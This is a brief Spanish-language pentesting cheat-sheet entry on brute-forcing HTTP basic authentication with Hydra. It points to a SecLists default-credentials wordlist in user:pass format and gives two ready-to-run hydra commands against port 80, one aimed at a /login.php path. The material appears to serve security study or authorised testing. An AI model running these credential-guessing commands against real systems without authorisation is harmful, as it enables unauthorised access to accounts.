- Tags : #auth_basic
Para estos casos no  nos vale el rockyu.txt pues para que funcione hydra la wordlist deme estar escrita en el formato **user:pass** por lo que utilizaremos otra wordlist.
**Resource** : /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -s 80 -f ip http-get

#En caso de que el formulario corra en otra pagina eje /login.php
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -s 80 -f ip http-get /login.php

```